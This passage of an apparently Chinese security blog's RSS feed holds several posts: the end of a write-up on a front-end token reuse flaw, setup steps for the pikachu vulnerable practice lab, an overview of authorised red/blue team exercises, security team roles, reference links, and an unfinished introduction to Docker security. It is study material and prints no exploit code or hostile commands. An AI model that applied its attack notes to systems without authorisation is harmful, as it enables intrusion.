&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/HYqUipn46W2dIPJ.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;随后直接进行攻击即可&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/Gci7VIE81eKRqyL.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-4&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;问题主要还是出在 token 出现在前端代码上，并且上一个登录所生成的 token 用作下一个登陆的 token，这样就留下了许多的操作空间。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/phpstudy+pikachu/</guid>
            <title>phpstudy平台和pikachu漏洞平台的搭建</title>
            <link>https://mobius-0.github.io/security/phpstudy+pikachu/</link>
            <category>工具</category>
            <category>安全</category>
            <pubDate>Sat, 03 Dec 2022 10:36:21 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;phpstudy平台搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpstudy平台搭建&#34;&gt;#&lt;/a&gt; phpstudy 平台搭建&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;首先进入下载网站: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueHAuY24=&#34;&gt;https://www.xp.cn&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;根据自己需要选择下载&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/C4cAK6SHk5xhQrq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;下载完成后双击 exe 进行安装&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;安装选项如安装目录等根据自己需要进行修改&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/WyOjEk2fQsnBq3b.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;安装成功后进入面板，启动一下两项服务&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/kS1ecHqsj47Dg8o.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;访问其内置默认网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xvY2FsaG9zdDo4MC8=&#34;&gt;http://localhost:80/&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;出现以下结果说明安装成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/sBQCwSrkJdRWOlx.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pikachu靶场搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pikachu靶场搭建&#34;&gt;#&lt;/a&gt; pikachu 靶场搭建&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;首先下载 pikachu 源代码 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3podWlmZW5nc2hhb25pYW5oYW5sdS9waWthY2h1&#34;&gt;https://github.com/zhuifengshaonianhanlu/pikachu&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;下载完成后将其解压至 phpstudy 安装目录下的 WWW 文件夹里&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;随后修改解压文件 inc 文件夹下的 config.inc.php 文件&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;根据自己需要修改连接的用户名和密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/HVLdcTv8uO4bfwE.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;接下来直接访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xvY2FsaG9zdDo4MDgwL3Bpa2FjaHUtbWFzdGVy&#34;&gt;http://localhost:8080/pikachu-master&lt;/span&gt; 即可进入靶场首页&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/</guid>
            <title>红蓝对抗</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/</link>
            <category>网络攻防</category>
            <pubDate>Tue, 29 Nov 2022 17:12:49 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概念&#34;&gt;#&lt;/a&gt; 概念&lt;/h1&gt;
&lt;p&gt;红蓝对抗的概念最早来源于 20 世纪 60 年代的美国演习，演习是专指军队进行大规模的实兵演习，演习中通常分为红军、蓝军，其中蓝军通常是指在部队模拟对抗演习专门扮演假想敌的部队，与红军 (代表我方正面部队) 进行针对性的训练，这种方式也被称作 Red Teaming。&lt;/p&gt;
&lt;p&gt;网络安全红蓝对抗的概念就源自于此。红军作为企业防守方，通过安全加固、攻击监测、应急处置等手段来保障企业安全。而蓝军作为攻击方，以发现安全漏洞，获取业务权限或数据为目标，利用各种攻击手段，试图绕过红军层层防护，达成既定目标。可能会造成混淆的是，在欧美一般采用红队代表攻击方，蓝队代表防守方，颜色代表正好相反。&lt;/p&gt;
&lt;h1 id=&#34;网络攻防演习&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络攻防演习&#34;&gt;#&lt;/a&gt; 网络攻防演习&lt;/h1&gt;
&lt;p&gt;比较有影响力的演习有 “锁盾”(Locked Shields)、“网络风暴” 等。其中 “锁盾” 由北约卓越网络防御合作中心 (CCDCOE，Cooperative Cyber Defence Centre of Excellence) 每年举办一次。“网络风暴” 由美国国土安全部 (DHS) 主导，2006 年开始，每两年举行一次。&lt;/p&gt;
&lt;p&gt;和 APT 攻击相比，攻防演习相对时长较短，只有 1~4 周，有个防守目标。而 APT 攻击目标唯一，时长可达数月至数年，更有隐蔽性。&lt;/p&gt;
&lt;h1 id=&#34;侧重&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#侧重&#34;&gt;#&lt;/a&gt; 侧重&lt;/h1&gt;
&lt;p&gt;企业网络蓝军工作内容主要包括渗透测试和红蓝对抗，这两种方式所使用的技术基本相同，但是侧重点不同。&lt;/p&gt;
&lt;p&gt;渗透测试侧重用较短的时间去挖掘更多的安全漏洞，一般不太关注攻击行为是否被监测发现，目的是帮助业务系统暴露和收敛更多风险。&lt;/p&gt;
&lt;p&gt;红蓝对抗更接近真实场景，偏向于实战，面对的场景复杂、技术繁多。侧重绕过防御体系，毫无声息达成获取业务权限或数据的目标。不求发现全部风险点，因为攻击动作越多被发现的概率越大，一旦被发现，红军就会把蓝军踢出战场。红蓝对抗的目的是检验在真实攻击中纵深防御能力、告警运营质量、应急处置能力。&lt;/p&gt;
&lt;h1 id=&#34;目标&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标&#34;&gt;#&lt;/a&gt; 目标&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;评估现有防御能力的有效性、识别防御体系的弱点并提出具体的应对方案&lt;/li&gt;
&lt;li&gt;利用真实有效的模拟攻击来评估因为安全问题所造成的潜在的业务影响，为安全管理提供有效的数据来量化安全投入的 ROI&lt;/li&gt;
&lt;li&gt;提高公司安全成熟度及其检测和响应攻击的能力&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;前期准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前期准备&#34;&gt;#&lt;/a&gt; 前期准备&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;组织结构图&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;全网拓扑图&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;各系统逻辑结构图&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;各系统之间的调用关系&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据流关系&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;资产梳理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;核心资产清单&lt;/li&gt;
&lt;li&gt;业务系统资产&lt;/li&gt;
&lt;li&gt;设备资产&lt;/li&gt;
&lt;li&gt;外包 / 第三方服务资产&lt;/li&gt;
&lt;li&gt;历史遗留资产&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;业务资产信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;业务系统名称&lt;/li&gt;
&lt;li&gt;业务系统类型&lt;/li&gt;
&lt;li&gt;服务器类型&lt;/li&gt;
&lt;li&gt;域名 / IP 地址&lt;/li&gt;
&lt;li&gt;服务端口&lt;/li&gt;
&lt;li&gt;版本&lt;/li&gt;
&lt;li&gt;系统部署位置&lt;/li&gt;
&lt;li&gt;开发框架&lt;/li&gt;
&lt;li&gt;中间件&lt;/li&gt;
&lt;li&gt;数据库&lt;/li&gt;
&lt;li&gt;责任人&lt;/li&gt;
&lt;li&gt;维护人员&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;设备资产信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设备名称&lt;/li&gt;
&lt;li&gt;设备版本号&lt;/li&gt;
&lt;li&gt;固件版本号&lt;/li&gt;
&lt;li&gt;IP 地址&lt;/li&gt;
&lt;li&gt;部署位置&lt;/li&gt;
&lt;li&gt;责任人&lt;/li&gt;
&lt;li&gt;维护人员&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;外包 / 第三方服务资产信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;厂商联系方式&lt;/li&gt;
&lt;li&gt;系统名称&lt;/li&gt;
&lt;li&gt;系统类型&lt;/li&gt;
&lt;li&gt;IP/URL 地址&lt;/li&gt;
&lt;li&gt;部署位置&lt;/li&gt;
&lt;li&gt;责任人&lt;/li&gt;
&lt;li&gt;维护人员&lt;/li&gt;
&lt;li&gt;厂商联系方式&lt;/li&gt;
&lt;li&gt;第三方值班人员&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;风险梳理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基础设施风险&lt;/li&gt;
&lt;li&gt;帐号权限梳理&lt;/li&gt;
&lt;li&gt;互联网风险排查&lt;/li&gt;
&lt;li&gt;收敛攻击面&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;应急响应计划&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;业务连续性计划&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;灾难恢复计划&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;行动流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#行动流程&#34;&gt;#&lt;/a&gt; 行动流程&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;攻击准备&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;明确授权范围、测试目标、限制条件等&lt;/li&gt;
&lt;li&gt;报备与授权流程&lt;/li&gt;
&lt;li&gt;行动成本与预算&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;攻击执行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;备案的时间区间内&lt;/li&gt;
&lt;li&gt;备案的目标范围内&lt;/li&gt;
&lt;li&gt;备案的攻击 IP 与网络环境&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;攻击完成&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;恢复所有修改&lt;/li&gt;
&lt;li&gt;移除所有持久化控制&lt;/li&gt;
&lt;li&gt;提交攻击报告与改进建议&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;注意事项&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注意事项&#34;&gt;#&lt;/a&gt; 注意事项&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;测试前进行报备&lt;/li&gt;
&lt;li&gt;有可能会影响到业务的操作时候提前沟通&lt;/li&gt;
&lt;li&gt;漏洞和业务沟通确认后再发工单修复&lt;/li&gt;
&lt;li&gt;漏洞闭环&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvOGlKczJPTjY2TlkxSmRidDdjLUJUQQ==&#34;&gt;以攻促防 企业蓝军建设思考&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2F2ZmlzaGVyLndpbi9hcmNoaXZlcy8xMTc1&#34;&gt;云上攻防：Red Teaming for Cloud&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvbmVvcG9pbnRzLzI1MjIyOS5odG1s&#34;&gt;网络攻防演练之企业蓝队建设指南&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%9B%A2%E9%98%9F%E5%BB%BA%E8%AE%BE/</guid>
            <title>团队建设</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%9B%A2%E9%98%9F%E5%BB%BA%E8%AE%BE/</link>
            <category>分工</category>
            <category>职能</category>
            <pubDate>Tue, 29 Nov 2022 17:10:49 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;人员分工&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#人员分工&#34;&gt;#&lt;/a&gt; 人员分工&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;部门负责人
&lt;ul&gt;
&lt;li&gt;负责组织整体的信息安全规划&lt;/li&gt;
&lt;li&gt;负责向高层沟通申请资源&lt;/li&gt;
&lt;li&gt;负责与组织其他部门的协调沟通&lt;/li&gt;
&lt;li&gt;共同推进信息安全工作&lt;/li&gt;
&lt;li&gt;负责信息安全团队建设&lt;/li&gt;
&lt;li&gt;负责安全事件应急工作处置&lt;/li&gt;
&lt;li&gt;负责推动组织安全规划的落实&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;合规管理员
&lt;ul&gt;
&lt;li&gt;负责安全相关管理制度、管理流程的制定，监督实施情况，修改和改进相关的制度和流程&lt;/li&gt;
&lt;li&gt;负责合规性迎检准备工作，包括联络、迎检工作推动，迎检结果汇报等所有相关工作&lt;/li&gt;
&lt;li&gt;负责与外部安全相关单位联络&lt;/li&gt;
&lt;li&gt;负责安全意识培训、宣传和推广&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安全技术负责人
&lt;ul&gt;
&lt;li&gt;业务安全防护整体技术规划和计划&lt;/li&gt;
&lt;li&gt;了解组织安全技术缺陷，并能找到方法进行防御&lt;/li&gt;
&lt;li&gt;安全设备运维&lt;/li&gt;
&lt;li&gt;服务器与网络基础设备的安全加固推进工作&lt;/li&gt;
&lt;li&gt;安全事件排查与分析，配合定期编写安全分析报告&lt;/li&gt;
&lt;li&gt;关注注业内安全事件， 跟踪最新漏洞信息，进行业务产品的安全检查&lt;/li&gt;
&lt;li&gt;负责漏洞修复工作推进，跟踪解决情况，问题收集&lt;/li&gt;
&lt;li&gt;了解最新安全技术趋势&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;渗透 / 代码审计人员
&lt;ul&gt;
&lt;li&gt;对组织业务网站、业务系统进行安全评估测试&lt;/li&gt;
&lt;li&gt;对漏洞结果提供解决方案和修复建议&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安全设备运维人员
&lt;ul&gt;
&lt;li&gt;负责设备配置和策略的修改&lt;/li&gt;
&lt;li&gt;负责协助其他部门的变更导致的安全策略修改的实现&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安全开发
&lt;ul&gt;
&lt;li&gt;根据组织安全的需要开发安全辅助工具或平台&lt;/li&gt;
&lt;li&gt;参与安全系统的需求分析、设计、编码等开发工作&lt;/li&gt;
&lt;li&gt;维护公司现有的安全程序与系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvQnFPRlAyMTdraU41NUlXYl9vUVAtdw==&#34;&gt;初入甲方的企业安全建设规划&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUmxCVEg5LXhyWTdOZDFaSkszS2pEUQ==&#34;&gt;企业安全项目架构实践分享&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTk2NQ==&#34;&gt;企业信息安全团队建设&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Cloud%20Security/%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5/</guid>
            <title>参考链接</title>
            <link>https://mobius-0.github.io/security/WebNote/Cloud%20Security/%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5/</link>
            <pubDate>Tue, 29 Nov 2022 16:46:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;文档&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文档&#34;&gt;#&lt;/a&gt; 文档&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvaG9tZS8=&#34;&gt;Kubernetes Documentation&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aWtpLm9wZW5zdGFjay5vcmcvd2lraS9NYWluX1BhZ2U=&#34;&gt;Openstack wiki&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubnNhLmdvdi9OZXdzLUZlYXR1cmVzL0ZlYXR1cmUtU3Rvcmllcy9BcnRpY2xlLVZpZXcvQXJ0aWNsZS8yNzE2OTgwL25zYS1jaXNhLXJlbGVhc2Uta3ViZXJuZXRlcy1oYXJkZW5pbmctZ3VpZGFuY2Uv&#34;&gt;NSA, CISA release Kubernetes Hardening Guidance&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Jvb3Rzb25namMva3ViZXJuZXRlcy1oYXJkZW5pbmctZ3VpZGFuY2U=&#34;&gt;Kubernetes Hardening Guidance&lt;/span&gt; Kubernetes 加固手册&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;元数据安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#元数据安全&#34;&gt;#&lt;/a&gt; 元数据安全&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3Rzb3NlY3VyZS5jb20vZXhwbG9pdGluZy1zc3JmLWluLWF3cy1lbGFzdGljLWJlYW5zdGFsay8=&#34;&gt;Exploiting SSRF in AWS Elastic Beanstalk&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;云存储&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#云存储&#34;&gt;#&lt;/a&gt; 云存储&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NlcGgvY2VwaA==&#34;&gt;ceph&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90cmFja2VyLmNlcGguY29tLw==&#34;&gt;ceph tracker&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Cloud%20Security/Docker/</guid>
            <title>Docker</title>
            <link>https://mobius-0.github.io/security/WebNote/Cloud%20Security/Docker/</link>
            <category>虚拟化</category>
            <category>Docker</category>
            <category>镜像</category>
            <pubDate>Tue, 29 Nov 2022 16:23:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;虚拟化技术与容器技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#虚拟化技术与容器技术&#34;&gt;#&lt;/a&gt; 虚拟化技术与容器技术&lt;/h1&gt;
&lt;h2 id=&#34;传统虚拟化技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#传统虚拟化技术&#34;&gt;#&lt;/a&gt; 传统虚拟化技术&lt;/h2&gt;
&lt;p&gt;传统虚拟化技术通过添加 hypervisor 层，虚拟出网卡，内存，CPU 等虚拟硬件，再在其上建立客户机，每个客户机都有自己的系统内核。传统虚拟化技术以虚拟机为管理单元，各虚拟机拥有独立的操作系统内核，不共用宿主机的软件系统资源，因此具有良好的隔离性，适用于云计算环境中的多租户场景。&lt;/p&gt;
&lt;h2 id=&#34;容器技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#容器技术&#34;&gt;#&lt;/a&gt; 容器技术&lt;/h2&gt;
&lt;p&gt;容器技术可以看作一种轻量级的虚拟化方式，容器技术在操作系统层进行虚拟化，可在宿主机内核上运行多个虚拟化环境。相比于传统的应用测试与部署，容器的部署无需预先考虑应用的运行环境兼容性问题；相比于传统虚拟机，容器无需独立的操作系统内核就可在宿主机中运行，实现了更高的运行效率与资源利用率。&lt;/p&gt;
&lt;h1 id=&#34;docker&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#docker&#34;&gt;#&lt;/a&gt; Docker&lt;/h1&gt;
&lt;p&gt;Docker 是目前最具代表性的容器平台之一，具有持续部署与测试、跨云平台支持等优点。在基于 Kubernetes 等容器编排工具实现的容器云环境中，通过对跨主机集群资源的调度，容器云可提供资源共享与隔离、容器编排与部署、应用支撑等功能。&lt;/p&gt;
&lt;h2 id=&#34;基本概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本概念&#34;&gt;#&lt;/a&gt; 基本概念&lt;/h2&gt;
&lt;p&gt;Docker 有三个基本概念，镜像（Image）、容器（Container）、仓库（Repository）。镜像是一个只读的模版，由一组文件系统通过 Union FS 技术组成。&lt;/p&gt;
&lt;p&gt;镜像是静态的定义，容器是从镜像创建的运行实例。容器的本质是进程，拥有自己独立的命名空间。&lt;/p&gt;
&lt;p&gt;仓库（Repository） 是集中存放镜像文件的场所，用于存储、分发镜像。&lt;/p&gt;
&lt;p&gt;容器可以被启动、开始、停止、删除，每个容器都是相互隔离的，可以把容器看做是一个简易版的 Linux 环境（包括 root 用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。&lt;/p&gt;
&lt;h2 id=&#34;组成&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#组成&#34;&gt;#&lt;/a&gt; 组成&lt;/h2&gt;
&lt;p&gt;Docker 引擎由如下主要组件构成：Docker 客户端（Docker Client）、Docker 守护进程（Docker daemon）、containerd 以及 RunC，它们共同负责容器的创建和运行。&lt;/p&gt;
&lt;p&gt;Docker Client 是和 Docker Daemon 建立通信客户端，Docker Client 可以通过 http/unix socket 等方式 Daemon 建立通信。&lt;/p&gt;
&lt;p&gt;Docker Daemon 是容器管理的守护进程，在宿主机运行，作为服务端接受来自客户端的请求，主要功能包括镜像管理、镜像构建、REST API、身份验证、安全、核心网络以及编排。Docker daemon 通过位于  &lt;code&gt;/var/run/docker.sock&lt;/code&gt;  的本地 IPC/Unix socket 来实现 Docker 远程 API，默认非 TLS 网络端口为 2375，TLS 默认端口为 2376。&lt;/p&gt;
&lt;p&gt;containerd 是容器技术标准化之后出现的，用于将容器运行时从 Docker Daemon 剥离。containerd 主要职责是镜像管理、容器执行。&lt;/p&gt;
&lt;p&gt;RunC 是 Docker 按照 OCF 标准制定的一种具体实现，实现了容器启动与停止、资源隔离等功能。&lt;/p&gt;
&lt;h2 id=&#34;数据&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据&#34;&gt;#&lt;/a&gt; 数据&lt;/h2&gt;
&lt;p&gt;Docker 的数据主要分为持久化和非持久化数据，默认情况下非持久化存储是自动创建生命周期与容器相同，删除容器也会删除非持久化数据，在 Linux 环境下，非持久化数据默认存储于  &lt;code&gt;/var/lib/docker/&lt;/code&gt;  下。&lt;/p&gt;
&lt;h2 id=&#34;网络&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络&#34;&gt;#&lt;/a&gt; 网络&lt;/h2&gt;
&lt;p&gt;Docker 网络架构源自一种叫作容器网络模型的方案，主要由 CNM、Libnetwork、网络驱动构程。&lt;/p&gt;
&lt;h1 id=&#34;安全风险与安全机制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全风险与安全机制&#34;&gt;#&lt;/a&gt; 安全风险与安全机制&lt;/h1&gt;
&lt;p&gt;在考虑 Docker 安全性的时候主要考虑以下几点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;内核本身的安全性及其对命名空间和 cgroups 的支持&lt;/li&gt;
&lt;li&gt;Docker 守护进程本身的攻击面&lt;/li&gt;
&lt;li&gt;内核的 “强化” 安全功能以及它们如何与容器进行交互&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;docker安全基线&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#docker安全基线&#34;&gt;#&lt;/a&gt; Docker 安全基线&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/11/29/Xd5eqSFysvYKQm1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;内核命名空间namespace&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内核命名空间namespace&#34;&gt;#&lt;/a&gt; 内核命名空间 /namespace&lt;/h2&gt;
&lt;p&gt;Docker 容器与 LXC 容器非常相似，并且具有相似的安全特性。当使用 docker 运行启动容器时，Docker 会在后台为容器创建一组命名空间和控制组。&lt;/p&gt;
&lt;p&gt;命名空间提供了一个最直接的隔离形式：在容器中运行的进程看不到或者无法影响在另一个容器或主机系统中运行的进程。&lt;/p&gt;
&lt;p&gt;每个容器也有自己的网络堆栈，这意味着一个容器不能获得对另一个容器的套接字或接口的特权访问。当然，如果主机系统相应设置，容器可以通过各自的网络接口交互。如果为容器指定公共端口或使用链接时，容器之间允许 IP 通信。&lt;/p&gt;
&lt;p&gt;它们可以相互 ping 通，发送 / 接收 UDP 数据包，并建立 TCP 连接，但是如果需要可以限制它们。从网络体系结构的角度来看，给定 Docker 主机上的所有容器都位于网桥接口上。这意味着它们就像通过普通的以太网交换机连接的物理机器一样。&lt;/p&gt;
&lt;h2 id=&#34;control-group&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#control-group&#34;&gt;#&lt;/a&gt; Control Group&lt;/h2&gt;
&lt;p&gt;控制组是 Linux 容器的另一个关键组件，主要作用是实施资源核算和限制。&lt;/p&gt;
&lt;p&gt;Cgroup 提供了许多有用的度量标准，但也有助于确保每个容器都能获得公平的内存，CPU 和磁盘 I/O; 更重要的是单个容器不能通过耗尽资源的方式来降低系统的性能。&lt;/p&gt;
&lt;p&gt;因此，尽管 Cgroup 不能阻止一个容器访问或影响另一个容器的数据和进程，但它们对于抵御一些拒绝服务攻击是至关重要的。它们对于多租户平台尤其重要，例如公共和私人 PaaS，即使在某些应用程序开始行为不当时也能保证一致的正常运行时间（和性能）。&lt;/p&gt;
&lt;h2 id=&#34;守护进程的攻击面&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#守护进程的攻击面&#34;&gt;#&lt;/a&gt; 守护进程的攻击面&lt;/h2&gt;
